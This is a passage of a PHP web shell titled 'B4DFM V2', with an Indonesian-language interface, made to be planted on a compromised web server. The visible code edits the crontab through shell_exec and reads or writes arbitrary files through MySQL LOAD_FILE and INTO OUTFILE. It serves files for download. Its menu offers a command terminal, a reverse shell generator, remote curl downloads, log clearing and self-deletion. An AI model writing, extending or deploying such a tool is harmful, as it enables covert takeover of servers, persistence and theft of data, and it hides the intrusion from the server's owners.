                    $env_vars['Apache Modules'] = implode(', ', apache_get_modules());
                }
                $r3sp0ns3 = ['status' => 'success', 'm3ss4g3' => 'Variabel lingkungan berhasil diambil.', 'env_vars' => $env_vars];
                break;

            case 'get_crontab': // from Crontab Manager
                if (function_exists('shell_exec')) {
                    $output = shell_exec("crontab -l 2>&1");
                    $r3sp0ns3 = ['status' => 'success', 'm3ss4g3' => 'Konten crontab berhasil diambil.', 'commandOutput' => $output];
                } else {
                    $r3sp0ns3 = ['status' => 'error', 'm3ss4g3' => "Fungsi shell_exec dinonaktifkan atau crontab tidak diizinkan."];
                }
                break;

            case 'edit_crontab': // from Crontab Manager
                $content = $d4t4['content'];
                if (function_exists('shell_exec')) {
                    $tmpfile = tempnam(sys_get_temp_dir(), 'crontab');
                    file_put_contents($tmpfile, $content);
                    $output = shell_exec("crontab " . escapeshellarg($tmpfile) . " 2>&1");
                    unlink($tmpfile);
                    if (empty($output)) {
                        $r3sp0ns3 = ['status' => 'success', 'm3ss4g3' => 'Crontab berhasil diperbarui.'];
                    } else {
                        $r3sp0ns3 = ['status' => 'error', 'm3ss4g3' => "Gagal memperbarui crontab: " . $output];
                    }
                } else {
                    $r3sp0ns3 = ['status' => 'error', 'm3ss4g3' => "Fungsi shell_exec dinonaktifkan untuk mengedit crontab."];
                }
                break;

            case 'db_file_rw': // For DB File Read/Write via SQL
                $file_path = $d4t4['file_path'];
                $file_content = $d4t4['file_content'];
                $rw_type = $d4t4['rw_type']; // 'read' or 'write'

                $conn = new mysqli($d4t4['host'], $d4t4['user'], $d4t4['pass'], $d4t4['db']);
                if ($conn->connect_error) {
                    $r3sp0ns3 = ['status' => 'error', 'm3ss4g3' => "Koneksi database gagal: " . $conn->connect_error];
                } else {
                    if ($rw_type === 'read') {
                        $query = "SELECT LOAD_FILE('{$conn->real_escape_string($file_path)}') AS file_content";
                        $result = $conn->query($query);
                        if ($result && $row = $result->fetch_assoc()) {
                            $r3sp0ns3 = ['status' => 'success', 'm3ss4g3' => 'File berhasil dibaca.', 'fileContent' => base64_encode($row['file_content'])];
                        } else {
                            $r3sp0ns3 = ['status' => 'error', 'm3ss4g3' => 'Gagal membaca file atau hak istimewa FILE tidak tersedia.'];
                        }
                    } elseif ($rw_type === 'write') {
                        $query = "SELECT '{$conn->real_escape_string($file_content)}' INTO OUTFILE '{$conn->real_escape_string($file_path)}'";
                        if ($conn->query($query) === TRUE) {
                            $r3sp0ns3 = ['status' => 'success', 'm3ss4g3' => 'File berhasil ditulis.'];
                        } else {
                            $r3sp0ns3 = ['status' => 'error', 'm3ss4g3' => 'Gagal menulis file atau hak istimewa FILE tidak tersedia.'];
                        }
                    }
                    $conn->close();
                }
                break;


            default:
                $r3sp0ns3 = ['status' => 'error', 'm3ss4g3' => 'Aksi tidak dikenal.'];
                break;
        }
    } catch (Exception $e) {
        $r3sp0ns3 = ['status' => 'error', 'm3ss4g3' => 'Terjadi kesalahan internal: ' . $e->getMessage()];
    }

    echo json_encode($r3sp0ns3);
    exit();
}

if (isset($_GET[$ak]) && $_GET[$ak] === 'd0wnl04d_f1l3' && isset($_GET['f1l3']) && isset($_GET[$tk]) && $_GET[$tk] === $_SESSION[$tk]) {
    header("X-Requested-With: XMLHttpRequest");
    header("Cache-Control: no-cache, no-store, must-revalidate");
    header("Pragma: no-cache");
    header("Expires: 0");
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . basename($download_file_path) . '"');
    header('Content-Length: ' . filesize($download_file_path));
    header("Access-Control-Allow-Origin: *");
    header("Access-Control-Allow-Methods: POST, GET, OPTIONS");
    header("Access-Control-Allow-Headers: X-Requested-With, Content-Type");

    $download_file_path = $_GET['f1l3'];
    $download_file_path = realpath($download_file_path);

    if ($download_file_path && file_exists($download_file_path) && is_file($download_file_path) && strpos($download_file_path, realpath($curr_D1r)) === 0) {
        ob_clean();
        flush();
        readfile($download_file_path);
        exit();
    } else {
        echo "File tidak ditemukan atau akses ditolak.";
        exit();
    }
}

?>
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>B4DFM V2</title>
  <link href="https://fonts.googleapis.com/css2?family=Protest+Strike&display=swap" rel="stylesheet" />
  <link href="https://fonts.googleapis.com/icon?family=Material+Icons+Outlined" rel="stylesheet" />
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
  
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.5/codemirror.min.css">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.5/theme/dracula.min.css">

  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">

  <style>
    :root {
        --bg-primary: #f9f9f9;
        --bg-secondary: #fff;
        --text-primary: #333;
        --text-secondary: #555;
        --border-color: #ddd;
        --header-bg: #2f3542;
        --header-text: white;
        --header-tools-text: #ccc;
        --header-tools-hover-bg: #3d7fff;
        --header-tools-hover-text: white;
        --sidebar-bg: #fff;
        --sidebar-border: #ddd;
        --sidebar-h2-color: #2f3542;
        --sidebar-btn-bg: #3d7fff;
        --sidebar-btn-text: white;
        --sidebar-btn-hover-bg: #2f65cc;
        --breadcrumb-bg: #e0e6f6;
        --breadcrumb-text: #2f3542;
        --breadcrumb-link-color: #3d7fff;
        --breadcrumb-separator-color: #888;
        --table-bg: white;
        --table-border: #eee;
        --table-header-bg: #f4f6f8;
        --table-header-text: #333;
        --table-row-even-bg: #f8faff;
        --table-row-hover-bg: #eef3ff;
        --file-icon-folder: #f6ad55;
        --file-icon-file: #5f6368;
        --action-btn-color: #3d7fff;
        --action-btn-hover-bg: rgba(61,127,255,0.1);
        --perm-green: #28a745;
        --perm-red: #dc3545;
        --input-bg: #f4f6fb;
        --input-border: #ccc;
        --input-text: #333;
        --input-focus-border: #3d7fff;
        --input-focus-shadow: rgba(61,127,255,0.2);
        --primary-btn-bg: #3d7fff;
        --primary-btn-hover-bg: #2f65cc;
        --copyright-color: #999;

        /* SweetAlert */
        --swal-bg: white;
        --swal-title-color: #2f3542;
        --swal-content-color: #555;
        --swal-input-bg: #f4f6fb;
        --swal-input-border: #ccc;
        --swal-input-text: #333;
        --swal-confirm-bg: #3d7fff;
        --swal-confirm-hover-bg: #2f65cc;
        --swal-cancel-bg: #6c757d;
        --swal-cancel-hover-bg: #5a6268;
        --swal-html-container-bg: #f8faff;
        --swal-html-container-border: #e0e6f6;
        --swal-html-container-text: #333;
        --swal-table-bg: #f8faff;
        --swal-table-header-bg: #f4f6f8;
        --swal-table-header-text: #333;
        --swal-table-border: #eee;
        --swal-table-row-even-bg: #f0f4ff;
        --swal-table-row-hover-bg: #eef3ff;

        /* CodeMirror & Highlight.js */
        --cm-bg: #f8faff;
        --cm-border: #e0e6f6;
        --cm-text: #333;
        --cm-linenumber: #888;
        --cm-selected-bg: #e0e6f6;
        --hljs-bg: #f8faff;
        --hljs-text: #333;
    }

    body.dark-mode {
        --bg-primary: #1a202c;
        --bg-secondary: #2d3748;
        --text-primary: #e2e8f0;
        --text-secondary: #a0aec0;
        --border-color: #4a5568;
        --header-bg: #2f3542;
        --header-text: white;
        --header-tools-text: #ccc;
        --header-tools-hover-bg: #4299e1;
        --header-tools-hover-text: white;
        --sidebar-bg: #2d3748;
        --sidebar-border: #4a5568;
        --sidebar-h2-color: #e2e8f0;
        --sidebar-btn-bg: #4299e1;
        --sidebar-btn-text: white;
        --sidebar-btn-hover-bg: #3182ce;
        --breadcrumb-bg: #2d3748;
        --breadcrumb-text: #cbd5e0;
        --breadcrumb-link-color: #63b3ed;
        --breadcrumb-separator-color: #cbd5e0;
        --table-bg: #2d3748;
        --table-border: #4a5568;
        --table-header-bg: #4a5568;
        --table-header-text: #e2e8f0;
        --table-row-even-bg: #2d3748;
        --table-row-hover-bg: #3a455a;
        --file-icon-folder: #f6ad55;
        --file-icon-file: #a0aec0;
        --action-btn-color: #63b3ed;
        --action-btn-hover-bg: rgba(99, 179, 237, 0.1);
        --perm-green: #48bb78;
        --perm-red: #e53e3e;
        --input-bg: #4a5568;
        --input-border: #63b3ed;
        --input-text: #e2e8f0;
        --input-focus-border: #4299e1;
        --input-focus-shadow: rgba(66, 153, 225, 0.5);
        --primary-btn-bg: #4299e1;
        --primary-btn-hover-bg: #3182ce;
        --copyright-color: #999;

        /* SweetAlert */
        --swal-bg: #2d3748;
        --swal-title-color: #a0aec0;
        --swal-content-color: #e2e8f0;
        --swal-input-bg: #4a5568;
        --swal-input-border: #63b3ed;
        --swal-input-text: #e2e8f0;
        --swal-confirm-bg: #4299e1;
        --swal-confirm-hover-bg: #3182ce;
        --swal-cancel-bg: #fc8181;
        --swal-cancel-hover-bg: #e53e3e;
        --swal-html-container-bg: #1a202c;
        --swal-html-container-border: #4a5568;
        --swal-html-container-text: #e2e8f0;
        --swal-table-bg: #2d3748;
        --swal-table-header-bg: #4a5568;
        --swal-table-header-text: #e2e8f0;
        --swal-table-border: #4a5568;
        --swal-table-row-even-bg: #2d3748;
        --swal-table-row-hover-bg: #3a455a;

        /* CodeMirror & Highlight.js */
        --cm-bg: #1a202c;
        --cm-border: #4a5568;
        --cm-text: #cbd5e0;
        --cm-linenumber: #718096;
        --cm-selected-bg: #4a5568;
        --hljs-bg: #1a202c;
        --hljs-text: #e2e8f0;
    }

    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: 'Protest Strike', sans-serif; /* Changed font */
      background: var(--bg-primary);
      color: var(--text-primary);
      display: flex;
      flex-direction: column;
      min-height: 100vh;
      transition: background-color 0.3s ease, color 0.3s ease; /* Smooth theme transition */
    }
    h1, h2, h3, strong {
        font-family: 'Protest Strike', sans-serif;
    }

    header {
      background: var(--header-bg);
      color: var(--header-text);
      padding: 15px 20px;
      box-shadow: 0 2px 5px rgba(0,0,0,0.2);
      transition: background-color 0.3s ease;
    }
    header .top {
      display: flex;
      justify-content: space-between;
      align-items: center;
      flex-wrap: wrap; 
    }
    header .top div {
      display: flex;
      align-items: center;
      gap: 8px;
    }
    header i.material-icons-outlined,
    header i.fas,
    header i.fab {
      font-size: 22px;
    }
    header .tools {
      display: flex;
      flex-wrap: wrap;
      gap: 10px;
      align-items: center;
      margin-top: 10px;
    }
    @media (min-width: 768px) {
        header .tools {
            margin-top: 0;
        }
    }
    header .tools span {
      font-size: 13px;
      color: var(--header-tools-text);
      white-space: nowrap;
      transition: color 0.3s ease;
    }
    .btn_c0ntr0l {
        background: none;
        border: 1px solid var(--border-color);
        color: var(--header-tools-text);
        padding: 5px 10px;
        border-radius: 5px;
        transition: all 0.2s ease-in-out;
        font-size: 13px;
        gap: 5px;
        box-shadow: none;
    }
    .btn_c0ntr0l:hover {
        background: var(--header-tools-hover-bg);
        color: var(--header-tools-hover-text);
        transform: translateY(-2px);
        box-shadow: 0 2px 8px rgba(0,0,0,0.3);
    }
    .theme-toggle-btn {
        background: none;
        border: none;
        color: var(--header-tools-text);
        cursor: pointer;
        font-size: 22px;
        padding: 5px;
        border-radius: 50%;
        transition: all 0.2s ease-in-out;
    }
    .theme-toggle-btn:hover {
        color: var(--header-tools-hover-text);
        background: var(--header-tools-hover-bg);
        transform: rotate(30deg) scale(1.1);
    }


    .wrapper {
      flex: 1;
      display: flex;
      flex-direction: row;
      flex-wrap: wrap;
    }
    .sidebar {
      width: 250px;
      background: var(--sidebar-bg);
      border-right: 1px solid var(--sidebar-border);
      padding: 20px;
      box-shadow: 2px 0 5px rgba(0,0,0,0.05);
      transition: background-color 0.3s ease, border-color 0.3s ease;
    }
    .sidebar h2 {
        font-size: 1.2rem;
        font-weight: 700;
        color: var(--sidebar-h2-color);
        margin-bottom: 15px;
        padding-bottom: 8px;
        border-bottom: 1px solid var(--sidebar-border);
        display: flex;
        align-items: center;
        gap: 8px;
        transition: color 0.3s ease, border-color 0.3s ease;
    }
    .sidebar button {
      display: flex;
      align-items: center;
      width: 100%;
      padding: 10px 15px;
      margin-bottom: 10px;
      background: var(--sidebar-btn-bg);
      color: var(--sidebar-btn-text);
      border: none;
      border-radius: 6px;
      font-size: 15px;
      cursor: pointer;
      transition: all 0.2s ease-in-out;
      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
      justify-content: center;
    }
    .sidebar button i.material-icons-outlined,
    .sidebar button i.fas,
    .sidebar button i.fab {
      margin-right: 10px;
      font-size: 1.3em;
    }
    .sidebar button:hover {
      background: var(--sidebar-btn-hover-bg);
      transform: translateY(-2px);
      box-shadow: 0 4px 8px rgba(0,0,0,0.2);
    }
    .sidebar .fnc_grp {
        display: flex;
        flex-wrap: wrap;
        gap: 10px;
        justify-content: center;
        margin-bottom: 20px;
    }
    .sidebar .fnc_grp button {
        flex: 1 1 auto;
        max-width: 180px;
    }


    .content {
      flex: 1;
      padding: 20px;
      overflow-x: auto;
    }

    .breadcrumb {
      display: flex;
      flex-wrap: nowrap;
      overflow-x: auto;
      margin-bottom: 20px;
      background: var(--breadcrumb-bg);
      padding: 8px 15px;
      border-radius: 25px;
      box-shadow: inset 0 1px 3px rgba(0,0,0,0.1);
      -ms-overflow-style: none;
      scrollbar-width: none;
      align-items: center;
      transition: background-color 0.3s ease;
    }
    .breadcrumb::-webkit-scrollbar {
        display: none;
    }
    .breadcrumb a {
      color: var(--breadcrumb-link-color);
      text-decoration: none;
      padding: 4px 8px;
      margin-right: 4px;
      border-radius: 15px;
      font-size: 14px;
      display: flex;
      align-items: center;
      white-space: nowrap;
      transition: all 0.2s ease-in-out;
    }
    .breadcrumb a:hover {
      background: rgba(61,127,255,0.1);
      transform: translateY(-1px);
    }
    .breadcrumb i.material-icons-outlined,
    .breadcrumb i.fas {
      font-size: 18px;
      margin-right: 6px;
      color: var(--breadcrumb-link-color);
    }
    .breadcrumb span {
      color: var(--breadcrumb-separator-color);
      margin: 0 5px;
    }

    table {
      width: 100%;
      border-collapse: collapse;
      background: var(--table-bg);
      box-shadow: 0 1px 3px rgba(0,0,0,0.05);
      margin-bottom: 10px;
      border-radius: 6px;
      overflow: hidden;
      transition: background-color 0.3s ease;
    }
    th, td {
      padding: 12px 14px;
      border: 1px solid var(--table-border);
      text-align: left;
      font-size: 14px;
      transition: border-color 0.3s ease;
    }
    th {
        background: var(--table-header-bg);
        color: var(--table-header-text);
        transition: background-color 0.3s ease, color 0.3s ease;
    }
    tbody tr:nth-child(even) {
      background: var(--table-row-even-bg);
    }
    tbody tr:hover {
      background: var(--table-row-hover-bg);
    }

    .file-icon {
        margin-right: 8px;
        font-size: 18px;
        vertical-align: middle;
    }
    .file-icon.folder { color: var(--file-icon-folder); }
    .file-icon.file { color: var(--file-icon-file); }

    .file-actions {
      display: flex;
      gap: 5px;
      flex-wrap: wrap;
    }
    .file-actions .action-btn {
      background: none;
      border: none;
      color: var(--action-btn-color);
      cursor: pointer;
      font-size: 18px;
      padding: 5px;
      border-radius: 4px;
      transition: all 0.2s ease-in-out;
    }
    .file-actions .action-btn:hover {
      background: var(--action-btn-hover-bg);
      transform: scale(1.1);
    }
    
    .perm-color-green { color: var(--perm-green) !important; }
    .perm-color-red { color: var(--perm-red) !important; }


    .sysinfo-container {
      background: var(--bg-secondary);
      padding: 20px;
      border-bottom: 1px solid var(--border-color);
      margin-bottom: 20px;
      border-radius: 8px;
      box-shadow: 0 1px 3px rgba(0,0,0,0.05);
      transition: background-color 0.3s ease, border-color 0.3s ease;
    }
    .sysinfo-container h2 {
        font-size: 1.3rem;
        font-weight: 600;
        color: var(--sidebar-h2-color);
        margin-bottom: 15px;
        padding-bottom: 8px;
        border-bottom: 1px solid var(--sidebar-border);
        display: flex;
        align-items: center;
        gap: 8px;
        transition: color 0.3s ease, border-color 0.3s ease;
    }
    .sysinfo-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
      gap: 15px;
    }
    .sysinfo-card {
      background: var(--input-bg); /* Use input background for cards */
      border-left: 4px solid var(--primary-btn-bg); /* Use primary button color as accent */
      padding: 12px 14px;
      font-size: 14px;
      box-shadow: 0 1px 2px rgba(0,0,0,0.05);
      border-radius: 4px;
      display: flex;
      flex-direction: column;
      word-break: break-word;
      transition: background-color 0.3s ease, border-color 0.3s ease;
    }
    .sysinfo-card label {
      font-weight: 600;
      margin-bottom: 4px;
      color: var(--breadcrumb-link-color); /* Blue accent */
      display: flex;
      align-items: center;
      font-size: 14px;
      transition: color 0.3s ease;
    }
    .sysinfo-card label i.material-icons-outlined {
      margin-right: 6px;
      font-size: 18px;
    }
    .sysinfo-card span {
      font-size: 13px;
      color: var(--text-primary);
      transition: color 0.3s ease;
    }

    .bottom-copyright {
      text-align: center;
      font-size: 13px;
      color: var(--copyright-color);
      margin-top: 30px;
      padding-top: 15px;
      border-top: 1px solid var(--border-color);
      transition: color 0.3s ease, border-color 0.3s ease;
    }

    /* SweetAlert2 custom styling */
    .swal2-popup {
        background-color: var(--swal-bg) !important;
        color: var(--swal-content-color) !important;
        border-radius: 0.75rem !important;
        box-shadow: 0 10px 15px rgba(0, 0, 0, 0.5) !important;
        font-family: 'Smooch Sans', sans-serif !important;
        transition: background-color 0.3s ease, color 0.3s ease;
    }
    .swal2-title {
        color: var(--swal-title-color) !important;
        font-size: 1.8rem !important;
        display: flex !important;
        align-items: center !important;
        justify-content: center !important;
        gap: 0.75rem !important;
        transition: color 0.3s ease;
    }
    .swal2-content {
        color: var(--swal-content-color) !important;
        font-size: 1.1rem !important;
        transition: color 0.3s ease;
    }
    .swal2-textarea, .swal2-input {
        background-color: var(--swal-input-bg) !important;
        border: 1px solid var(--swal-input-border) !important;
        color: var(--swal-input-text) !important;
        border-radius: 0.5rem !important;
        padding: 0.75rem !important;
        font-family: 'Smooch Sans', sans-serif !important;
        transition: background-color 0.3s ease, border-color 0.3s ease, color 0.3s ease;
    }
    .swal2-confirm {
        background-color: var(--swal-confirm-bg) !important;
        color: white !important;
        font-weight: 700 !important;
        transition: background-color 0.3s ease !important;
    }
    .swal2-confirm:hover { background-color: var(--swal-confirm-hover-bg) !important; }
    .swal2-cancel {
        background-color: var(--swal-cancel-bg) !important;
        color: white !important;
        font-weight: 700 !important;
        transition: background-color 0.3s ease !important;
    }
    .swal2-cancel:hover { background-color: var(--swal-cancel-hover-bg) !important; }
    .swal2-html-container {
        white-space: pre-wrap;
        word-break: break-all;
        max-height: 500px;
        overflow-y: auto;
        text-align: left;
        font-family: monospace;
        padding: 1rem;
        background-color: var(--swal-html-container-bg) !important;
        border-radius: 0.5rem;
        margin-top: 1rem;
        color: var(--swal-html-container-text) !important;
        transition: background-color 0.3s ease, color 0.3s ease;
    }
    .swal2-html-container table { background-color: var(--swal-table-bg) !important; color: var(--swal-html-container-text) !important; }
    .swal2-html-container th, .swal2-html-container td { border: 1px solid var(--swal-table-border) !important; }
    .swal2-html-container th { background-color: var(--swal-table-header-bg) !important; color: var(--swal-table-header-text) !important; }
    .swal2-html-container tr:nth-child(even) { background-color: var(--swal-table-row-even-bg) !important; }
    .swal2-html-container tr:hover { background-color: var(--swal-table-row-hover-bg) !important; }
    .swal2-progress-steps .swal2-active { background-color: var(--sidebar-btn-bg) !important; }
    .swal2-progress-steps .swal2-active ~ .swal2-progress-step { background-color: var(--sidebar-btn-bg) !important; }

    .loading-overlay {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background-color: rgba(0, 0, 0, 0.7);
        display: flex;
        justify-content: center;
        align-items: center;
        z-index: 9999;
        visibility: hidden;
        opacity: 0;
        transition: visibility 0s, opacity 0.3s linear;
    }
    .loading-overlay.show {
        visibility: visible;
        opacity: 1;
    }
    .spinner {
        border: 8px solid rgba(255,255,255,0.1);
        border-top: 8px solid var(--sidebar-btn-bg);
        border-radius: 50%;
        width: 60px;
        height: 60px;
        animation: spin 1s linear infinite;
    }
    @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
    }

    .mass-delete-bar {
        position: fixed;
        bottom: -100px;
        left: 0;
        width: 100%;
        background-color: var(--header-bg);
        color: var(--header-text);
        padding: 1rem;
        box-shadow: 0 -4px 10px rgba(0,0,0,0.5);
        display: flex;
        justify-content: center;
        align-items: center;
        gap: 1rem;
        transition: bottom 0.3s ease-in-out;
        z-index: 1000;
        border-top-left-radius: 0.75rem;
        border-top-right-radius: 0.75rem;
    }
    .mass-delete-bar.show {
        bottom: 0;
    }
    .mass-delete-bar button {
        background-color: var(--perm-red);
        color: white;
        padding: 0.75rem 1.5rem;
        border-radius: 0.5rem;
        font-weight: 600;
        transition: background-color 0.3s ease;
        cursor: pointer;
        display: flex;
        align-items: center;
        gap: 0.5rem;
    }
    .mass-delete-bar button:hover {
        background-color: var(--perm-red);
        filter: brightness(1.1);
    }
    .mass-delete-bar span {
        color: var(--header-text);
        font-size: 1.1rem;
    }

    /* CodeMirror and Highlight.js adjustments */
    .swal2-container .CodeMirror {
        height: 400px;
        border: 1px solid var(--cm-border) !important;
        border-radius: 0.5rem;
        background-color: var(--cm-bg) !important;
        font-family: monospace;
        font-size: 0.95rem;
        color: var(--cm-text) !important;
        transition: background-color 0.3s ease, border-color 0.3s ease, color 0.3s ease;
    }
    .swal2-container .CodeMirror-scroll,
    .swal2-container .CodeMirror-sizer { background-color: var(--cm-bg) !important; }
    .swal2-container .CodeMirror-linenumber { color: var(--cm-linenumber) !important; }
    .cm-s-dracula.CodeMirror .CodeMirror-gutters {
        background: var(--cm-bg) !important;
        color: var(--cm-linenumber) !important;
        border-right: 1px solid var(--cm-border) !important;
    }
    .cm-s-dracula .CodeMirror-cursor { border-left: 1px solid var(--cm-text) !important; }
    .cm-s-dracula div.CodeMirror-selected { background: var(--cm-selected-bg) !important; }
    .swal2-container .CodeMirror-vscrollbar,
    .swal2-container .CodeMirror-hscrollbar { background-color: var(--sidebar-btn-bg) !important; }

    .hljs {
        background: var(--hljs-bg) !important;
        padding: 1em !important;
        border-radius: 0.5rem !important;
        color: var(--hljs-text) !important;
        transition: background-color 0.3s ease, color 0.3s ease;
    }

    /* Media queries for responsiveness */
    @media (max-width: 768px) {
      .wrapper { flex-direction: column; }
      .sidebar {
        width: 100%;
        display: flex;
        flex-wrap: wrap;
        gap: 10px;
        border-right: none;
        border-bottom: 1px solid var(--sidebar-border);
        padding-bottom: 10px;
        justify-content: center;
      }
      .sidebar h2 {
          width: 100%;
          text-align: center;
          margin-bottom: 10px;
          border-bottom: none;
          padding-bottom: 0;
      }
      .sidebar .fnc_grp {
          width: 100%;
          justify-content: center;
          margin-bottom: 0;
          gap: 0.8rem;
      }
      .sidebar button { flex: 1 1 auto; max-width: 180px; }
      .content { padding: 10px; }
      .breadcrumb { margin-bottom: 15px; }
      th, td { padding: 8px 10px; }
      .file-actions { flex-wrap: wrap; gap: 3px; }
      .mass-delete-bar { padding: 0.8rem; flex-direction: column; gap: 0.8rem;}
      .mass-delete-bar span { font-size: 1rem; }
      .mass-delete-bar button { padding: 0.6rem 1.2rem; font-size: 0.9rem; }
    }
  </style>
</head>
<body class="dark-mode"> <!-- Apply dark-mode by default or based on localStorage -->

<div class="loading-overlay" id="loading_overlay">
    <div class="spinner"></div>
</div>

<header>
  <div class="top">
    <div><i class="material-icons-outlined">terminal</i> <strong>B4DFM V2</strong></div>
    <div class="tools">
      <span id="servertime">--:--</span>
      <button class="btn_c0ntr0l" onclick="clear_l0g_fnc()"><i class="material-icons-outlined">delete_forever</i> Clear Log</button>
      <button class="btn_c0ntr0l" onclick="k1ll_s3ss10n_fnc()"><i class="material-icons-outlined">cancel</i> Kill Session</button>
      <button class="btn_c0ntr0l" onclick="self_d3l3t3_fnc()"><i class="material-icons-outlined">auto_delete</i> Self-Delete</button>
      <button class="btn_c0ntr0l" onclick="toggleTheme()"><i class="material-icons-outlined" id="theme-toggle-icon">light_mode</i></button>
      <a href="?l0g0ut_k3y=true" class="btn_c0ntr0l"><i class="material-icons-outlined">logout</i> Logout</a>
    </div>
  </div>
</header>

<div class="wrapper">
  <aside class="sidebar">
    <h2 class="fnc_h2"><i class="material-icons-outlined">folder_open</i> Manajemen File</h2>
    <div class="fnc_grp">
      <button onclick="sh0w_cr34t3_f0ld3r_d1al0g()"><i class="material-icons-outlined">create_new_folder</i>New Folder</button>
      <button onclick="sh0w_cr34t3_f1l3_d1al0g()"><i class="material-icons-outlined">note_add</i>New File</button>
      <button onclick="sh0w_upL04d_d1al0g()"><i class="material-icons-outlined">upload_file</i>Upload File</button>
      <button onclick="sh0w_cUrL_d0wnl0ad_d1al0g()"><i class="material-icons-outlined">file_download</i>Curl Download</button>
      <button onclick="sh0w_z1p_3xtr4ct_d1al0g()"><i class="material-icons-outlined">archive</i>Zip Extractor</button>
      <button onclick="sh0w_file_content_search_d1al0g()"><i class="material-icons-outlined">search</i>Cari Konten</button>
      <button onclick="sh0w_copy_move_d1al0g()"><i class="material-icons-outlined">content_copy</i>Salin/Pindah</button>
      <button onclick="sh0w_create_archive_d1al0g()"><i class="material-icons-outlined">folder_zip</i>Buat Arsip</button>
    </div>

    <h2 class="fnc_h2"><i class="material-icons-outlined">computer</i> Alat Server & Sistem</h2>
    <div class="fnc_grp">
      <button onclick="sh0w_c0mm4nd_d1al0g()"><i class="material-icons-outlined">terminal</i>Terminal CMD</button>
      <button onclick="t0ggl3_sYs_1nf0()"><i class="material-icons-outlined">info</i>System Info</button>
      <button onclick="sh0w_php_1nf0()"><i class="fab fa-php"></i>PHP Info</button>
      <button onclick="sh0w_reverse_shell_gen_d1al0g()"><i class="material-icons-outlined">call_received</i>Reverse Shell</button>
      <button onclick="sh0w_php_ini_editor_d1al0g()"><i class="material-icons-outlined">tune</i>PHP Ini Editor</button>
    </div>

    <h2 class="fnc_h2"><i class="material-icons-outlined">storage</i> Manajemen Database</h2>
    <div class="fnc_grp">
      <button onclick="sh0w_db_m4n4g3r_d1al0g()"><i class="material-icons-outlined">data_object</i>Database Manager</button>
      <button onclick="sh0w_db_export_import_d1al0g()"><i class="material-icons-outlined">import_export</i>DB Import/Export</button>
      <button onclick="sh0w_db_schema_viewer_d1al0g()"><i class="material-icons-outlined">view_list</i>DB Schema</button>
      <button onclick="sh0w_db_file_rw_d1al0g()"><i class="material-icons-outlined">swap_horiz</i>DB File R/W</button>
    </div>
  </aside>

  <main class="content">
    <div class="breadcrumb">
      <i class="material-icons-outlined">folder</i>
      <?php
      $path_parts = explode('/', $curr_D1r);
      $full_path = '';
      foreach ($path_parts as $index => $part) {
          if (empty($part) && $index !== 0) continue;
          $full_path .= ($index === 0 && !empty($part) ? '' : '/') . $part;
          if ($index === 0 && empty($part) && count($path_parts) > 1) {
              echo '<a href="?' . $pk . '=/"><i class="material-icons-outlined">home</i> Root</a><span>/</span>';
              continue;
          }
          echo '<a href="?' . $pk . '=' . urlencode($full_path) . '">' . htmlentities($part) . '</a><span>/</span>';
      }
      ?>
    </div>

    <div class="sysinfo-container" id="sYs_1nf0_s3ct" style="display: none;">
        <h2 class="fnc_h2"><i class="material-icons-outlined">info</i> System Information</h2>
        <div class="sysinfo-grid">
            <div class="sysinfo-card">
                <label><i class="material-icons-outlined">dns</i> OS</label><span><?php echo php_uname('s') . ' ' . php_uname('r'); ?></span>
            </div>
            <div class="sysinfo-card">
                <label><i class="material-icons-outlined">code</i> PHP Version</label><span><?php echo PHP_VERSION; ?></span>
            </div>
            <div class="sysinfo-card">
                <label><i class="material-icons-outlined">public</i> Server Software</label><span><?php echo $_SERVER['SERVER_SOFTWARE']; ?></span>
            </div>
            <div class="sysinfo-card">
                <label><i class="material-icons-outlined">memory_alt</i> Disabled Functions</label><span><?php $disabled_funcs = ini_get('disable_functions'); echo empty($disabled_funcs) ? 'None' : htmlspecialchars($disabled_funcs); ?></span>
            </div>
            <div class="sysinfo-card">
                <label><i class="material-icons-outlined">storage</i> Disk Space</label><span>Total: <?php echo round(disk_total_space($curr_D1r) / (1024 * 1024 * 1024), 2) . ' GB'; ?> | Free: <?php echo round(disk_free_space($curr_D1r) / (1024 * 1024 * 1024), 2) . ' GB'; ?></span>
            </div>
            <div class="sysinfo-card">
                <label><i class="material-icons-outlined">person</i> Current User</label><span><?php echo function_exists('posix_getpwuid') ? posix_getpwuid(fileowner($curr_D1r))['name'] . '/' . posix_getgrgid(filegroup($curr_D1r))['name'] : 'N/A'; ?></span>
            </div>
        </div>
    </div>


    <table>
      <thead>
        <tr>
          <th><input type="checkbox" id="select_all_items" class="form-checkbox h-4 w-4 text-blue-600 rounded"></th>
          <th data-sort="name">Name <i class="fas fa-sort" style="font-size:12px; margin-left:4px; color:#888;"></i></th>
          <th data-sort="type">Type <i class="fas fa-sort" style="font-size:12px; margin-left:4px; color:#888;"></i></th>
          <th data-sort="size">Size <i class="fas fa-sort" style="font-size:12px; margin-left:4px; color:#888;"></i></th>
          <th data-sort="permission">Permissions <i class="fas fa-sort" style="font-size:12px; margin-left:4px; color:#888;"></i></th>
          <th data-sort="date">Modified <i class="fas fa-sort" style="font-size:12px; margin-left:4px; color:#888;"></i></th>
          <th>Actions</th>
        </tr>
      </thead>
      <tbody id="f1l3_l1st_b0dy">
        <?php
        $d1r_c0nt3nts = [];
        $curr_dir_items = scandir($curr_D1r);

        if ($curr_dir_items !== false) {
            foreach ($curr_dir_items as $item) {
                if ($item == '.' || ($item == '..' && realpath($curr_D1r) == realpath('/'))) {
                    continue;
                }

                $item_path = $curr_D1r . DIRECTORY_SEPARATOR . $item;
                $is_dir = is_dir($item_path);
                $type = $is_dir ? 'Folder' : 'File';
